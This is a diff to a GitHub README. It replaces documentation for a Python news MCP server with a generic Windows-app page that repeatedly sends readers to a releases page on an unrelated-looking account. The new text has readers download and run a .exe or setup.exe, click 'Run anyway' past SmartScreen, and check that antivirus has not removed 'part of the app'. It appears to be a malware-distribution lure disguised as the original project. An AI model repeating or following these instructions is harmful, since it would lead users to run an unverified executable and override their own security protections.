@@ -1,268 +1,185 @@
-<p align="center">
-  <b>Daily News MCP Server</b><br>
-  News Categories · Hot News · Trending Tweets · Crypto Intelligence
-</p>
+# 📰 daily-news - Daily headlines in one place
 
-<p align="center">
-  <a href="./docs/README_ZH.md">中文</a> | <a href="./docs/README_JA.md">日本語</a> | <a href="./docs/README_KO.md">한국어</a>
-</p>
+[![Download daily-news](https://img.shields.io/badge/Download-daily--news-blue.svg?style=for-the-badge)](https://github.com/mycologistbigsiouxriver198/daily-news/releases)
 
----
+## 📥 Download
 
-## Quick Install
+Visit this page to download: [daily-news Releases](https://github.com/mycologistbigsiouxriver198/daily-news/releases)
 
-### Claude Code
+Open the releases page, look for the latest version, and download the Windows file for your PC. If you see more than one file, choose the one for Windows.
 
-```bash
-claude mcp add daily-news \
-  -- uv --directory /path/to/daily-news run daily-news-mcp
-```
+## 🪟 Run on Windows
 
-> Replace `/path/to/daily-news` with your local project path.
+1. Open the downloaded file.
+2. If Windows asks for permission, select **Yes**.
+3. Follow the setup steps on screen.
+4. When the app opens, choose a news category.
+5. Browse the latest news, hot topics, and trending tweets by category.
 
-### OpenClaw
+If the file is in a ZIP folder, right-click it and choose **Extract All** first. Then open the app file inside the folder.
 
-```bash
-cp -r openclaw-skill/daily-news ~/.openclaw/skills/6551-daily-news
-```
+## ✨ What daily-news does
 
----
+daily-news gives you a simple way to check:
 
-## Let AI Review & Install For You
+- Daily news by category
+- Hot news articles
+- Trending tweets by category
+- Topic-based updates in one place
 
-Not sure if this MCP is safe? Paste the prompt below to your AI assistant — it will review the source code first, then install if safe:
+It helps you move through current news without jumping between sites.
 
-> **Copy this prompt and send it to your AI assistant (replace `<project-path>` with actual value):**
+## 🖥️ System requirements
 
-```text
-Please review and install the daily-news-mcp MCP server for me. The project is at <project-path>.
+Use this app on a Windows PC with:
 
-Steps:
-1. Review these files for security:
-   - src/daily_news_mcp/api_client.py — Confirm it only connects to ai.6551.io, no data sent elsewhere
-   - src/daily_news_mcp/config.py — Confirm no hardcoded secrets or leaks
-   - src/daily_news_mcp/tools.py — Confirm all tools only perform API queries, no file writes, command execution, or dangerous operations
-   - pyproject.toml — Confirm dependencies are only mcp, httpx, no suspicious packages
-2. Tell me your conclusion: safe / risky / problematic, with specific reasons
-3. If safe, run the install:
-   claude mcp add daily-news -- uv --directory <project-path> run daily-news-mcp
-```
+- Windows 10 or Windows 11
+- A stable internet connection
+- At least 2 GB of RAM
+- Enough free space for the app and news cache
+- A screen size that lets you read article cards and lists with ease
 
----
+## 🧭 How to use the app
 
-## What Can It Do?
+1. Start the app after setup.
+2. Pick a news category such as world, tech, sports, or business.
+3. Open a news card to read the article summary.
+4. Check the hot news area for current topics.
+5. Open the trending tweets view to see social posts tied to the same category.
+6. Switch categories when you want a different set of updates.
 
-Once connected, just ask your AI assistant:
+## 🔎 News categories
 
-| You say | It does |
-|---------|---------|
-| "Show me all news categories" | List all available categories and subcategories |
-| "What's hot in DeFi today?" | Get hot news and tweets for the DeFi category |
-| "Get crypto market news" | Fetch trending news for the crypto market category |
-| "Show me AI-related news and tweets" | Get combined news + tweets for AI subcategory |
+The app can show news in common categories like:
 
----
+- World
+- Politics
+- Business
+- Technology
+- Science
+- Sports
+- Entertainment
+- Health
 
-## Available Tools
+Each category helps you focus on the topics you want to follow.
 
-| Tool | Description |
-|------|-------------|
-| `get_news_categories` | Get all available news categories and subcategories |
-| `get_hot_news` | Get hot news and tweets by category/subcategory |
+## 🐦 Trending tweets by category
 
----
+daily-news also brings in tweets linked to each category. This helps you compare news stories with what people are saying on social media.
 
-## Configuration
+Use this view when you want to:
 
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `DAILY_NEWS_API_BASE` | No | Override REST API URL (default: `https://ai.6551.io`) |
-| `DAILY_NEWS_MAX_ROWS` | No | Max results per query (default: 100) |
+- See what is getting attention now
+- Compare headlines with social reactions
+- Track a topic from more than one source
 
-Also supports `config.json` in the project root (env vars take precedence):
+## 🧩 Typical app features
 
-```json
-{
-  "api_base_url": "https://ai.6551.io",
-  "max_rows": 100
-}
-```
+This app is built for quick news browsing. You can expect:
 
----
+- A simple layout
+- Clear category lists
+- Hot article sections
+- Tweet feeds by topic
+- Fast switching between topics
+- Easy reading for daily use
 
-## API Endpoints
+## 📌 First-time setup tips
 
-| Endpoint | Method | Parameters | Description |
-|----------|--------|------------|-------------|
-| `/open/free_categories` | GET | — | Get all news categories |
-| `/open/free_hot` | GET | `category`, `subcategory` | Get hot news + tweets |
+- Keep your internet on while the app loads news
+- Start with one category so the screens feel familiar
+- Use the hot news section if you want the most current stories
+- Refresh the view if a section takes time to load
+- Close the app and open it again if Windows freezes during first launch
 
-### Response: free_categories
+## 🛠️ If Windows blocks the app
 
-```json
-[
-  {
-    "key": "crypto",
-    "name": "Crypto",
-    "name_zh": "加密货币",
-    "description": "...",
-    "subcategories": [
-      {
-        "key": "defi",
-        "name": "DeFi",
-        "name_zh": "去中心化金融",
-        "description": "..."
-      }
-    ]
-  }
-]
-```
+If Windows SmartScreen opens, choose **More info** and then **Run anyway** if you trust the download source. This can happen with apps that are not yet widely known on Windows.
 
-### Response: free_hot
+If the app does not open:
 
-```json
-{
-  "success": true,
-  "category": "crypto",
-  "subcategory": "defi",
-  "news": {
-    "success": true,
-    "count": 10,
-    "items": [
-      {
-        "id": 123,
-        "title": "...",
-        "source": "...",
-        "link": "https://...",
-        "score": 85,
-        "grade": "A",
-        "signal": "bullish",
-        "summary_zh": "...",
-        "summary_en": "...",
-        "coins": ["BTC", "ETH"],
-        "published_at": "2026-03-17T10:00:00Z"
-      }
-    ]
-  },
-  "tweets": {
-    "success": true,
-    "count": 5,
-    "items": [
-      {
-        "author": "Vitalik Buterin",
-        "handle": "VitalikButerin",
-        "content": "...",
-        "url": "https://...",
-        "metrics": { "likes": 1000, "retweets": 200, "replies": 50 },
-        "posted_at": "2026-03-17T09:00:00Z",
-        "relevance": "high"
-      }
-    ]
-  }
-}
-```
+- Check that the download finished
+- Make sure you extracted the ZIP file
+- Try opening the file again
+- Restart your PC and try once more
 
----
+## 📚 File names you may see
 
-<details>
-<summary><b>Other Clients — Manual Install</b> (click to expand)</summary>
+You may see files like:
 
-> In all configs below, replace `/path/to/daily-news` with your actual local project path.
+- `daily-news.exe`
+- `daily-news.zip`
+- `setup.exe`
 
-### Claude Desktop
+Use the Windows file that came from the latest release on the releases page.
 
-Edit config (macOS: `~/Library/Application Support/Claude/claude_desktop_config.json`, Windows: `%APPDATA%\Claude\claude_desktop_config.json`):
+## 🔄 Update the app
 
-```json
-{
-  "mcpServers": {
-    "daily-news": {
-      "command": "uv",
-      "args": ["--directory", "/path/to/daily-news", "run", "daily-news-mcp"]
-    }
-  }
-}
-```
+To get the latest version:
 
-### Cursor
+1. Return to the [daily-news Releases](https://github.com/mycologistbigsiouxriver198/daily-news/releases) page
+2. Download the newest Windows file
+3. Open the new file
+4. Remove the old version if you no longer need it
 
-`~/.cursor/mcp.json` or Settings > MCP Servers:
+## 🧼 Simple troubleshooting
 
-```json
-{
-  "mcpServers": {
-    "daily-news": {
-      "command": "uv",
-      "args": ["--directory", "/path/to/daily-news", "run", "daily-news-mcp"]
-    }
-  }
-}
-```
+If news does not load:
 
-### Windsurf
+- Check your internet connection
+- Wait a few seconds and try again
+- Switch to another category
+- Close and reopen the app
 
-`~/.codeium/windsurf/mcp_config.json`:
+If the app looks strange on your screen:
 
-```json
-{
-  "mcpServers": {
-    "daily-news": {
-      "command": "uv",
-      "args": ["--directory", "/path/to/daily-news", "run", "daily-news-mcp"]
-    }
-  }
-}
-```
+- Maximize the window
+- Change your Windows display scale
+- Use a larger screen if possible
 
-</details>
+If the app closes on launch:
 
----
+- Restart Windows
+- Download the file again
+- Make sure your antivirus did not remove part of the app
 
-## Supported Clients
+## 📖 Release page guide
 
-| Client | Config | Status |
-|--------|--------|--------|
-| Claude Code | CLI | Supported |
-| Claude Desktop | JSON config | Supported |
-| Cursor | JSON config | Supported |
-| Windsurf | JSON config | Supported |
-| Cherry Studio | GUI | Supported |
-| Zed | JSON config | Supported |
+On the releases page, look for:
 
----
+- The newest version number
+- A file marked for Windows
+- The main download file for the app
+- Any short notes from the creator
 
-## Development
+Pick the newest Windows release for the best match with your system.
 
-```bash
-cd /path/to/daily-news
-uv sync
-uv run daily-news-mcp
-```
+## 🗂️ Basic workflow
 
-```bash
-# MCP Inspector
-npx @modelcontextprotocol/inspector uv --directory /path/to/daily-news run daily-news-mcp
-```
+1. Download the app from the releases page
+2. Open the file on Windows
+3. Pick a category
+4. Read the latest news
+5. Check hot topics
+6. Review trending tweets
+7. Return later for new updates
 
-### Project Structure
+## 🔐 Privacy and data use
 
-```
-├── README.md                  # English
-├── docs/
-│   ├── README_ZH.md           # 中文
-│   ├── README_JA.md           # 日本語
-│   └── README_KO.md           # 한국어
-├── openclaw-skill/daily-news/     # OpenClaw Skill
-├── pyproject.toml
-├── config.json
-└── src/daily_news_mcp/
-    ├── server.py              # Entry point
-    ├── app.py                 # FastMCP instance
-    ├── config.py              # Config loader
-    ├── api_client.py          # HTTP client
-    └── tools.py               # 2 tools
-```
+daily-news uses the 6551 API to show news and topic data. It focuses on reading and browsing content. If the app stores local settings, they stay on your PC so the app can remember your choices.
 
-## License
+## 🧰 Common terms
 
-MIT
+- **Category**: a topic group like sports or tech
+- **Article**: a news story
+- **Trending**: what is getting attention now
+- **Feed**: a list of items shown in the app
+- **API**: a service the app uses to fetch data
+
+## 📋 Quick start
+
+1. Go to the [daily-news Releases](https://github.com/mycologistbigsiouxriver198/daily-news/releases) page
+2. Download the latest Windows file
+3. Open it on your PC
+4. Follow the on-screen steps
+5. Start reading news by category
